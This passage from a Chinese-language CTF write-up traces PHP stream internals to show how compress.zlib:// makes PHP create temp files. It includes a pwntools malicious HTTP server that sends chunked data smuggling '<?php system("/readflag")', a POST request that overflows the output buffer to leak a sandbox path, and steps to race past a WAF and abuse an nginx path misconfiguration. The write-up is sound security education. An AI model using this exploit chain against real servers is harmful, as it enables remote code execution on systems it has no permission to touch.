class="line">}</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;<code>STREAM_WILL_CAST</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7528;&#x6765;&#x5E72;&#x561B;&#xFF0C;&#x5728;<code>main/php_streams.h</code>&#x5B9A;&#x4E49;&#x4E86;&#x8BE5;&#x6807;&#x5FD7;&#x4F4D;:</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="hljs-comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="hljs-comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="hljs-comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="hljs-comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="hljs-comment"> * up working more optimally.</span></span><br><span class="line"><span class="hljs-comment"> * */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></table></figure><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5C06; stream &#x8F6C;&#x6362;&#x6210; FILE* &#x7684;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0E;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x6709;&#x5173;&#x4E86;&#x3002;</p><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_open_wrapper_ex</code>&#x51FD;&#x6570;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_open_wrapper_ex</code>&#x3002;</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">if</span> (stream != <span class="hljs-literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) {</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrue<span class="hljs-keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">return</span> stream;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></table></figure><p>&#x8BE5;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E86;<code>php_stream_make_seekable_rel</code>&#xFF0C;&#x5E76;&#x5411;&#x5176;&#x4E2D;&#x4F20;&#x5165;&#x4E86;<code>STREAM_WILL_CAST</code>&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_make_seekable_rel</code>&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_make_seekable</code>&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;</p><p>main/streams/cast.c</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* {{{ php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="hljs-keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="hljs-keyword">int</span> flags STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-keyword">if</span> (newstream == <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_FAILED;</span><br><span class="line">true}</span><br><span class="line">true*newstream = <span class="hljs-literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="hljs-number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;<span class="hljs-built_in">seek</span> != <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_UNCHANGED;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">true<span class="hljs-comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) {</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line">true} <span class="hljs-keyword">else</span> {</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x679C;<code>flags</code>&#x4E0E;<code>PHP_STREAM_PREFER_STDIO</code>&#x90FD;&#x88AB;&#x8BBE;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x800C;<code>PHP_STREAM_PREFER_STDIO</code>&#x5728; main/php_streams.h &#x4E2D;&#x5DF2;&#x7ECF;&#x88AB; define</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PHP_STREAM_PREFER_STDIO1</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5173;&#x5FC3; flags &#x7684;&#x503C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x786E;&#x5B9A; flags &#x7684;&#x503C;&#x975E;&#x96F6;&#x5373;&#x53EF;&#xFF0C;&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x8DDF;&#x8FDB;&#x6211;&#x4EEC;&#x6613;&#x77E5; flags &#x7684;&#x5728;&#x8FD9;&#x91CC;&#x975E;&#x96F6;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x8C03;&#x7528;&#x4E86;<code>php_stream_fopen_tmpfile</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E86;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x3002;</p><p>&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x8DD1;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x7528; pwntools &#x8D77;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7528;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5927;&#x6587;&#x4EF6;</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_chunk</span><span class="hljs-params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;{}\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(hex(len(data))[<span class="hljs-number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):</span><br><span class="line">    l = listen(<span class="hljs-number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="hljs-string">&apos;&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;X&apos;</span>)</span><br><span class="line">    data2 = <span class="hljs-string">&apos;&lt;?php system(&quot;/readflag&quot;); exit(); /*&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;b&apos;</span>)</span><br><span class="line">    data3 = <span class="hljs-string">&apos;c*/&apos;</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;c&apos;</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="hljs-string">&apos;\r\n\r\n&apos;</span>)</span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="hljs-string">&apos;waiting...&apos;</span>)</span><br><span class="line">    print(<span class="hljs-string">&apos;sending php code...&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;0\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6837;&#x6211;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x7528; fswatch &#x5F88;&#x660E;&#x663E;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x751F;&#x6210;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png" alt></p><h3 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h3><p>&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x7EC8;&#x7A76;&#x8FD8;&#x662F;&#x4F1A;&#x88AB; php &#x5220;&#x9664;&#x6389;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8981;&#x8FDB;&#x884C;&#x5305;&#x542B;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x65B9;&#x6CD5;&#x8BA9;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5C3D;&#x53EF;&#x80FD;&#x4E45;&#x7684;&#x7559;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x624D;&#x6709;&#x673A;&#x4F1A;&#x53BB;&#x5305;&#x542B;&#x5B83;&#x3002;</p><p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x8BA9;&#x5B83;&#x505C;&#x7559;&#x6BD4;&#x8F83;&#x4E45;&#x7684;&#x65F6;&#x95F4;&#xFF1A;</p><ul><li>&#x4F7F;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#xFF0C;&#x8FD9;&#x6837;&#x5728;&#x4F20;&#x8F93;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x8BA9;&#x6211;&#x4EEC;&#x5305;&#x542B;&#x5230;&#x6587;&#x4EF6;&#x4E86;&#x3002;</li><li>&#x4F7F;&#x7528; FTP &#x901F;&#x5EA6;&#x63A7;&#x5236;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x6839;&#x672C;&#x4E0A;&#x8FD8;&#x662F;&#x4F20;&#x8F93;&#x901F;&#x5EA6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x9650;&#x5236;&#x4F20;&#x8F93;&#x901F;&#x7387;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>compress.zlib://ftp://</code>&#x5F62;&#x5F0F;&#xFF0C;&#x63A7;&#x5236; FTP &#x901F;&#x5EA6;&#x5373;&#x53EF;</li></ul><h3 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x8981;&#x770B;&#x5982;&#x4F55;&#x6765;&#x5BF9;&#x5173;&#x952E;&#x5730;&#x65B9;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x4E86;&#x3002;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x5E08;&#x5085;&#xFF0C;&#x5305;&#x62EC;&#x4E00;&#x8840;&#x7684; TokyoWesterns &#x7684;&#x961F;&#x5458;&#x4EE5;&#x53CA;&#x53C2;&#x8003;&#x4E86;&#x4E3B;&#x8981;&#x7684;&#x516C;&#x5F00; WP&#xFF0C;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x5229;&#x7528;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x4E4B;&#x95F4;&#x6781;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p>&#x4EC0;&#x4E48;&#x610F;&#x601D;&#x5462;&#xFF1F;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;&#x6781;&#x5176;&#x7406;&#x60F3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x6BB5;&#x5783;&#x573E;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x901A;&#x8FC7;<code>stripos</code>&#x7684;&#x5224;&#x65AD;&#x5C31;&#x662F;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6587;&#x4EF6;&#x6570;&#x636E;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5229;&#x7528; HTTP &#x957F;&#x94FE;&#x63A5;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x53EA;&#x8981;&#x8FD9;&#x4E2A;&#x94FE;&#x63A5;&#x4E0D;&#x65AD;&#x5F00;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7B2C;&#x4E8C;&#x6BB5;&#x542B;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6570;&#x636E;&#x4E86;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4F7F;<code>include_once</code>&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x80FD;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x5229;&#x7528;&#x7ADE;&#x4E89;&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x5305;&#x542B;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x70B9;&#x3002;</p><h3 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h3><p>&#x6700;&#x540E;&#xFF0C;&#x8981;&#x505A;&#x5230;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x81EA;&#x7136;&#x5F97;&#x5148;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x800C;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x968F;&#x673A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53C8;&#x4E0D;&#x5F97;&#x4E0D;&#x901A;&#x8FC7;&#x67D0;&#x4E9B;&#x65B9;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x8DEF;&#x5F84;&#x3002;</p><p>&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x770B;&#x5230;&#x9898;&#x76EE;&#x662F;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x4E86;&#x8DEF;&#x5F84;&#xFF0C;&#x4F46;&#x662F;&#x4E4D;&#x4E00;&#x770B;&#x4EE3;&#x7801;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EA;&#x80FD;&#x7B49;&#x5230;&#x5168;&#x90E8;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x62FF;&#x5230;&#x8DEF;&#x5F84;&#xFF0C;&#x7136;&#x800C;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x8BF4;&#x5230;&#x7684;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x7684;&#x957F;&#x94FE;&#x63A5;&#x4E0D;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7ACB;&#x5373;&#x5F97;&#x5230;&#x6211;&#x4EEC;&#x7684; sandbox &#x8DEF;&#x5F84;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x8FC7;&#x5927;&#x7684; name &#x53C2;&#x6570;&#xFF0C;&#x5BFC;&#x81F4; PHP output buffer &#x6EA2;&#x51FA;&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;&#xFF0C;&#x53C2;&#x8003;&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="hljs-string">&apos;&apos;&apos;file=compress.zlib://http://192.168.151.132:8080&amp;name=&apos;&apos;&apos;</span>.strip() + <span class="hljs-string">&apos;a&apos;</span> * (<span class="hljs-number">1024</span> * <span class="hljs-number">7</span> + <span class="hljs-number">882</span>)</span><br><span class="line">    r.send(<span class="hljs-string">&apos;&apos;&apos;POST / HTTP/1.1\r</span></span><br><span class="line"><span class="hljs-string">Host: localhost\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Content-Length: {}\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="hljs-string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(len(data), data))</span><br></pre></td></tr></table></figure><h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h3><p>&#x6240;&#x4EE5;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E3A;&#x4EE5;&#x4E0B;&#xFF1A;</p><ol><li>&#x5229;&#x7528; <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> &#x6765;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x6301; HTTP &#x957F;&#x94FE;&#x63A5;&#x7ADE;&#x4E89;&#x4FDD;&#x5B58;&#x6211;&#x4EEC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;</li><li>&#x5229;&#x7528;&#x8D85;&#x957F;&#x7684; name &#x6EA2;&#x51FA; output buffer &#x5F97;&#x5230; sandbox &#x8DEF;&#x5F84;</li><li>&#x5229;&#x7528; Nginx &#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF0C;&#x901A;&#x8FC7; <code>.well-known../files/sandbox/</code>&#x6765;&#x83B7;&#x53D6;&#x6211;&#x4EEC; tmp &#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;</li><li>&#x53D1;&#x9001;&#x53E6;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; tmp &#x6587;&#x4EF6;&#xFF0C;&#x6B64;&#x65F6;&#x5E76;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;</li><li>&#x7ED5;&#x8FC7; WAF &#x5224;&#x65AD;&#x540E;&#xFF0C;&#x53D1;&#x9001; PHP &#x4EE3;&#x7801;&#x6BB5;&#xFF0C;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; PHP &#x4EE3;&#x7801;&#x62FF;&#x5230; Flag </li></ol><p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x5173;&#x952E;&#x70B9;&#x4E3B;&#x8981;&#x662F;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;(&#x6765;&#x81EA; @wupco)&#xFF1A;</p><ol><li>&#x9700;&#x8981;&#x5229;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x6216;ftp&#x901F;&#x5EA6;&#x9650;&#x5236;&#x8BA9;&#x8FDE;&#x63A5;&#x4FDD;&#x6301;</li><li>&#x4F20;&#x5165;name&#x8FC7;&#x5927; overflow output buffer&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;</li><li>tmp&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5728;&#x4E24;&#x79CD;&#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x75AF;&#x72C2;&#x5207;&#x6362;&#xFF0C;&#x4F7F;&#x5F97;&#x7B2C;&#x4E00;&#x6B21;<code>file_get_contents</code>&#x83B7;&#x53D6;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x5E26;&#x6709;<code>&lt;?</code>,<code>include</code>&#x7684;&#x65F6;&#x5019;&#x662F;&#x6B63;&#x5E38;php&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5361;&#x65F6;&#x95F4;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x591A;&#x8DD1;&#x51E0;&#x6B21;&#x624D;&#x884C;</li><li><code>.well-known../files/</code>&#x662F;nginx&#x914D;&#x7F6E;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#xFF0C;&#x7528;&#x6765;&#x5217;&#x751F;&#x6210;&#x7684;tmp&#x6587;&#x4EF6;</li></ol><p>&#x7531;&#x4E8E;&#x7B2C;&#x4E8C;&#x4E2A;&#x6781;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x51C6;&#x786E;&#x5730;&#x8C03;&#x63A7;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#xFF0C;&#x4E4B;&#x524D;&#x6CA1;&#x8C03;&#x63A7;&#x597D;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#xFF0C;&#x6302;&#x4E00;&#x665A;&#x4E0A;&#x811A;&#x672C;&#x90FD;&#x6CA1;&#x6709; hit 